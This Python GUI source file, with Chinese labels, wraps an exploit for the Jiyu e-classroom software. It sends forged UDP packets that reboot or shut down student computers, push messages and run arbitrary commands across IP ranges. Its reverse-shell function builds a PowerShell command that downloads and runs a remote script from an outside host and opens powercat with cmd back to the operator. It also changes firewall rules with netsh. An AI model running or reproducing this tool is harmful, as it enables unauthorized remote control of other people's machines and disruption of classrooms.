#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
极域电子教室 UDP 攻击工具 - GUI 版
基于 ht0Ruial/Jiyu_udp_attack 核心逻辑 + PySide6 界面
"""

import sys
import os
import socket
import random
import threading
import importlib.util
from time import sleep
from struct import pack
from re import compile
from os import popen
from datetime import datetime

from PySide6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QPushButton, QLabel, QLineEdit, QSpinBox, QTextEdit, QFrame,
    QGridLayout, QGroupBox, QMessageBox, QDialog,
)
from PySide6.QtCore import Qt, Signal, QObject
from PySide6.QtGui import QTextCursor

# =============================================================================
# 动态导入原始核心模块（绕过 argparse）
# =============================================================================

_core = None

def _load_core():
    global _core
    if _core is not None:
        return _core
    # 备份并伪造 sys.argv，防止 argparse 报错
    old_argv = sys.argv
    sys.argv = ['jiyu_core.py']
    try:
        spec = importlib.util.spec_from_file_location(
            'jiyu_core',
            os.path.join(os.path.dirname(__file__), 'Jiyu_udp_attack.py')
        )
        _core = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(_core)
    finally:
        sys.argv = old_argv
    return _core

def get_store():
    return _load_core().store

def get_basic_cmd():
    return _load_core().basicCMD

def fmt_msg(content):
    return _load_core().format_b4_send(content)

def parse_ip(ip):
    return _load_core().get_ip(ip)

def build_packet(cmdtype, content):
    return _load_core().pkg_sendlist(cmdtype, content)


# =============================================================================
# 信号 - 线程安全更新 UI
# =============================================================================

class LogSignal(QObject):
    log = Signal(str)
    done = Signal()


# =============================================================================
# 发送函数（适配 GUI）
# =============================================================================

def send_packets(target_ips, port, send_list, loops=1, timeout=22, callback=None):
    if not send_list:
        return "[-] 发送列表为空"
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        for times in range(loops):
            for ip in target_ips:
                for pkt in send_list:
                    payload = pack("%dB" % len(pkt), *pkt)
                    client.sendto(payload, (ip, port))
            msg = f"[+] 第 {times + 1}/{loops} 次执行完毕"
            if callback:
                callback(msg)
            if times != loops - 1:
                sleep(timeout)
    finally:
        client.close()
    return "[+] 全部发送成功"


# =============================================================================
# Shell 对话框
# =============================================================================

class ShellDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("反弹 Shell")
        self.resize(520, 360)
        self._ui()

    def _ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(12, 12, 12, 12)
        info = QLabel("将在后台执行 powercat 监听，IP 只能为单个目标")
        info.setWordWrap(True)
        info.setStyleSheet("color: #888; font-size: 12px;")
        layout.addWidget(info)
        self.log_area = QTextEdit()
        self.log_area.setReadOnly(True)
        self.log_area.setStyleSheet("""
            QTextEdit { background: #0d0d0d; color: #00ff00;
                font-family: Consolas, monospace; font-size: 12px;
                border: 1px solid #333; border-radius: 4px; padding: 8px; }
        """)
        layout.addWidget(self.log_area)
        btn_layout = QHBoxLayout()
        btn_layout.addStretch()
        close_btn = QPushButton("关闭")
        close_btn.setStyleSheet("""
            QPushButton { background: #2d2d2d; color: #e0e0e0;
                border: 1px solid #444; border-radius: 4px;
                padding: 6px 20px; font-size: 13px; }
            QPushButton:hover { background: #3d3d3d; }
        """)
        close_btn.clicked.connect(self.close)
        btn_layout.addWidget(close_btn)
        layout.addLayout(btn_layout)

    def append_log(self, msg):
        self.log_area.append(msg)
        cursor = self.log_area.textCursor()
        cursor.movePosition(QTextCursor.End)
        self.log_area.setTextCursor(cursor)


# =============================================================================
# 主窗口
# =============================================================================

STYLE_DARK = """
QMainWindow, QDialog { background: #141414; }
QLabel { color: #e0e0e0; font-size: 13px; }
QLineEdit, QSpinBox {
    background: #1f1f1f; color: #e0e0e0;
    border: 1px solid #333; border-radius: 4px;
    padding: 4px 8px; font-size: 13px;
}
QLineEdit:focus, QSpinBox:focus { border-color: #1890ff; }
QTextEdit {
    background: #0d0d0d; color: #00ff00;
    font-family: Consolas, monospace; font-size: 12px;
    border: 1px solid #333; border-radius: 4px; padding: 8px;
}
QGroupBox {
    color: #e0e0e0; border: 1px solid #333;
    border-radius: 6px; margin-top: 8px;
    padding-top: 16px; font-size: 13px; font-weight: 600;
}
QGroupBox::title { subcontrol-origin: margin; left: 12px; padding: 0 6px; }
"""


class JiyuUdpGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("极域 UDP 攻击工具 v1.0")
        self.resize(720, 620)
        self.setMinimumSize(600, 500)
        self._busy = False
        self._ui()

    # ---- UI 构建 ----

    def _btn(self, text, color, cb):
        btn = QPushButton(text)
        btn.setStyleSheet(f"""
            QPushButton {{
                background: {color}; color: #fff; border: none;
                border-radius: 6px; padding: 10px 0; font-size: 14px;
                font-weight: 600;
            }}
            QPushButton:hover {{ background: {self._light(color)}; }}
            QPushButton:disabled {{ background: #333; color: #666; }}
        """)
        btn.clicked.connect(cb)
        return btn

    @staticmethod
    def _light(h):
        h = h.lstrip('#')
        return f"#{min(255,int(h[0:2],16)+30):02x}{min(255,int(h[2:4],16)+30):02x}{min(255,int(h[4:6],16)+30):02x}"

    def _ui(self):
        cw = QWidget()
        self.setCentralWidget(cw)
        layout = QVBoxLayout(cw)
        layout.setSpacing(10)
        layout.setContentsMargins(14, 14, 14, 14)

        # 标题
        t = QLabel("极域 UDP 攻击工具 v1.0")
        t.setStyleSheet("font-size: 18px; font-weight: 700; color: #1890ff; padding: 4px 0;")
        layout.addWidget(t)

        # 目标设置
        g1 = QGroupBox("目标设置")
        h1 = QHBoxLayout(g1)
        h1.setSpacing(8)
        h1.addWidget(QLabel("目标 IP:"))
        self.ip = QLineEdit()
        self.ip.setPlaceholderText("例: 192.168.80.12 | 192.168.80.10-56 | 192.168.80.1/24")
        h1.addWidget(self.ip, 1)
        h1.addWidget(QLabel("端口:"))
        self.port = QSpinBox(); self.port.setRange(1, 65535); self.port.setValue(4705)
        h1.addWidget(self.port)
        h1.addWidget(QLabel("循环:"))
        self.loop = QSpinBox(); self.loop.setRange(1, 100); self.loop.setValue(1)
        h1.addWidget(self.loop)
        h1.addWidget(QLabel("间隔秒:"))
        self.to = QSpinBox(); self.to.setRange(0, 300); self.to.setValue(22)
        h1.addWidget(self.to)
        layout.addWidget(g1)

        # 操作按钮
        g2 = QGroupBox("操作")
        g = QGridLayout(g2)
        g.setSpacing(8)

        self.b_r = self._btn("🔄 重启", "#1890ff", lambda: self._qcmd('r'))
        g.addWidget(self.b_r, 0, 0)
        self.b_s = self._btn("⏻ 关机", "#ff4d4f", lambda: self._qcmd('s'))
        g.addWidget(self.b_s, 0, 1)
        self.b_ul = self._btn("🔓 解锁屏幕", "#52c41a", self._unlock)
        g.addWidget(self.b_ul, 0, 2)
        self.b_lk = self._btn("🔒 锁定屏幕", "#faad14", self._lock)
        g.addWidget(self.b_lk, 0, 3)

        self.b_info = self._btn("ℹ️ 获取信息", "#1890ff", self._info)
        g.addWidget(self.b_info, 1, 0)
        self.b_shell = self._btn("💻 反弹 Shell", "#722ed1", self._shell)
        g.addWidget(self.b_shell, 1, 1)

        # 发送消息
        h_msg = QHBoxLayout()
        self.b_msg = self._btn("📨 发送消息", "#1890ff", self._send_msg)
        self.b_msg.setFixedWidth(120)
        h_msg.addWidget(self.b_msg)
        self.msg_in = QLineEdit()
        self.msg_in.setPlaceholderText("输入要发送的消息内容...")
        h_msg.addWidget(self.msg_in, 1)
        g.addLayout(h_msg, 2, 0, 1, 4)

        # 执行命令
        h_cmd = QHBoxLayout()
        self.b_cmd = self._btn("⚡ 执行命令", "#eb2f96", self._send_cmd)
        self.b_cmd.setFixedWidth(120)
        h_cmd.addWidget(self.b_cmd)
        self.cmd_in = QLineEdit()
        self.cmd_in.setPlaceholderText("例: cmd.exe /c ipconfig 或 calc.exe")
        h_cmd.addWidget(self.cmd_in, 1)
        g.addLayout(h_cmd, 3, 0, 1, 4)

        layout.addWidget(g2)

        # 日志
        layout.addWidget(QLabel("执行日志"))
        hl = QHBoxLayout()
        hl.addStretch()
        clr = QPushButton("清空日志")
        clr.setStyleSheet("""
            QPushButton { background: #2d2d2d; color: #e0e0e0;
                border: 1px solid #444; border-radius: 4px;
                padding: 4px 14px; font-size: 12px; }
            QPushButton:hover { background: #3d3d3d; }
        """)
        clr.clicked.connect(lambda: self.log.clear())
        hl.addWidget(clr)
        layout.addLayout(hl)

        self.log = QTextEdit()
        self.log.setReadOnly(True)
        layout.addWidget(self.log, 1)

        self.setStyleSheet(STYLE_DARK)

    # ---- 日志 ----

    def _log(self, msg):
        ts = datetime.now().strftime("%H:%M:%S")
        self.log.append(f"[{ts}] {msg}")
        c = self.log.textCursor(); c.movePosition(QTextCursor.End)
        self.log.setTextCursor(c)

    def _ok(self, m): self._log(f"✅ {m}")
    def _fail(self, m): self._log(f"❌ {m}")

    # ---- 辅助 ----

    def _targets(self):
        t = self.ip.text().strip()
        if not t:
            self._fail("请输入目标 IP"); return None
        ips = parse_ip(t)
        if not ips:
            self._fail(f"IP 格式错误: {t}"); return None
        return ips

    def _busy_set(self, v):
        self._busy = v
        for b in [self.b_r, self.b_s, self.b_ul, self.b_lk,
                   self.b_info, self.b_shell, self.b_msg, self.b_cmd]:
            b.setEnabled(not v)

    def _send_task(self, targets, port, pkts, loop, to, cb=None):
        sig = LogSignal()
        sig.log.connect(self._log)
        done_sig = LogSignal()
        done_sig.done.connect(lambda: self._busy_set(False))
        def task():
            try:
                r = send_packets(targets, port, pkts, loop, to, sig.log.emit)
                sig.log.emit(r)
            except Exception as e:
                sig.log.emit(f"[-] 错误: {e}")
            finally:
                done_sig.done.emit()
        threading.Thread(target=task, daemon=True).start()

    # ---- 操作 ----

    def _qcmd(self, t):
        ips = self._targets()
        if not ips: return
        self._busy_set(True)
        self._log(f"[*] 执行{'重启' if t == 'r' else '关机'}...")
        bc = get_basic_cmd()
        self._send_task(ips, self.port.value(), [bc[f'-{t}']],
                        self.loop.value(), self.to.value())

    def _lock(self):
        self._log("[*] 正在锁定屏幕（需管理员权限）...")
        self.b_lk.setEnabled(False)
        threading.Thread(target=self._do_lock, daemon=True).start()

    def _unlock(self):
        self._log("[*] 正在解锁屏幕...")
        threading.Thread(target=self._do_unlock, daemon=True).start()

    def _do_lock(self):
        try:
            popen('netsh advfirewall firewall set rule name="StudentMain.exe" new action=block')
            sleep(1)
            self._ok("屏幕已锁定，已阻止 StudentMain.exe 联网")
        except Exception as e:
            self._fail(f"锁定失败: {e}")
        finally:
            self.b_lk.setEnabled(True)

    def _do_unlock(self):
        try:
            popen('netsh advfirewall firewall set rule name="StudentMain.exe" new action=allow')
            self._ok("屏幕已解锁，已允许 StudentMain.exe 联网")
        except Exception as e:
            self._fail(f"解锁失败: {e}")

    def _info(self):
        threading.Thread(target=self._do_info, daemon=True).start()

    def _do_info(self):
        try:
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            self._log(f"[*] 本机 IP: {ip}")
            try:
                tl = popen("tasklist|find \"Student\"").read()
                p = compile(r'[e]\s*\d{1,5}\s*[C]')
                m = p.search(tl)
                if m:
                    pid = m.group()[1:-1].strip()
                    ns = popen(f"netstat -ano |find \"{pid}\"").read()
                    p2 = compile(rf"{ip}:\d{{1,5}}\s*[*]{{1}}")
                    ports = p2.findall(ns)
                    clean = [x.strip(ip).strip(" :*") for x in ports]
                    self._ok(f"学生端端口: {', '.join(clean)}")
                else:
                    self._log("[-] 未找到 Student.exe 进程")
            except Exception:
                self._log("[-] 获取进程信息失败")
        except Exception as e:
            self._fail(f"获取信息失败: {e}")

    def _send_msg(self):
        msg = self.msg_in.text().strip()
        if not msg:
            self._fail("请输入要发送的消息"); return
        ips = self._targets()
        if not ips: return
        self._busy_set(True)
        self._log(f"[*] 发送消息: {msg}")
        pkt = build_packet('-msg', msg)
        self._send_task(ips, self.port.value(), [pkt],
                        self.loop.value(), self.to.value())

    def _send_cmd(self):
        cmd = self.cmd_in.text().strip()
        if not cmd:
            self._fail("请输入要执行的命令"); return
        ips = self._targets()
        if not ips: return
        self._busy_set(True)
        self._log(f"[*] 执行命令: {cmd}")
        pkt = build_packet('-c', cmd)
        self._send_task(ips, self.port.value(), [pkt],
                        self.loop.value(), self.to.value())

    def _shell(self):
        ips = self._targets()
        if not ips: return
        if len(ips) > 1:
            self._fail("反弹 Shell 只能指定单个 IP"); return
        target = ips[0]
        self._log("[*] 启动反弹 Shell...")
        dlg = ShellDialog(self)
        dlg.show()
        threading.Thread(target=self._do_shell, args=(target, dlg), daemon=True).start()

    def _do_shell(self, target, dlg):
        try:
            num = random.randint(1, 65535)
            local_ip = socket.gethostbyname(socket.gethostname())
            cmd = (f"powershell IEX (New-Object System.Net.Webclient)"
                   f".DownloadString('https://xss.pt/hYvg');"
                   f"powercat -c {local_ip} -p {num} -e cmd")
            pkt = build_packet('-c', cmd)
            send_packets([target], self.port.value(), [pkt])
            dlg.append_log(f"[+] 已发送 payload 到 {target}")
            dlg.append_log(f"[*] 请在本地监听: {local_ip}:{num}")
            dlg.append_log(f"[*] 或手动执行: powercat -l -p {num}")
        except Exception as e:
            dlg.append_log(f"[-] Shell 错误: {e}")


# =============================================================================
# 入口
# =============================================================================

def main():
    app = QApplication(sys.argv)
    app.setStyle('Fusion')
    w = JiyuUdpGUI()
    w.show()
    sys.exit(app.exec())


if __name__ == '__main__':
    main()
